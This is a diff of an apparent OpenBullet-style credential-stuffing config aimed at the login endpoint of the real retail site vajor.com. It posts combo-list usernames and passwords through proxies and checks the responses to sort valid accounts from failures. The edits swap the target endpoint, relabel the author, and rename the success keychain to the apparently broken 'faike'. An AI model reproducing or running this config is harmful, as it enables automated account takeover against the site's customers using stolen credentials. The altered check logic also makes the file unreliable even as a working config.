@@ -4,7 +4,7 @@
   "SuggestedBots": 50,
   "LastModified": "2019-07-08T18:14:39.6913518+05:30",
   "AdditionalInfo": "",
-  "Author": "KHUSHAL13 (@KHUSHAL13)",
+  "Author": "Useragent (@KHUSHAL13)",
   "Version": "1.0.0",
   "IgnoreResponseErrors": false,
   "NeedsProxies": true,
@@ -25,7 +25,7 @@
 }
 
 [SCRIPT]
-REQUEST POST "https://www.vajor.com/mobilelogin/index/ajaxlogin/" 
+REQUEST POST "https://www.vajor.com/mobilelogin/index/loginpage/" 
   CONTENT "form_key=Cvzavq4NU7YYaMk9&login%5Busername%5D=<USER>&login%5Bpassword%5D=<PASS>" 
   CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
   HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
@@ -35,7 +35,7 @@ REQUEST POST "https://www.vajor.com/mobilelogin/index/ajaxlogin/"
   HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
   HEADER "Referer: https://www.vajor.com/customer/account/login/referer/aHR0cHM6Ly93d3cudmFqb3IuY29tLw%2C%2C/" 
 KEYCHECK 
-  KEYCHAIN Success OR 
+  KEYCHAIN faike OR 
     KEY "false" 
     KEY "{\"error\":false" 
   KEYCHAIN Failure OR 
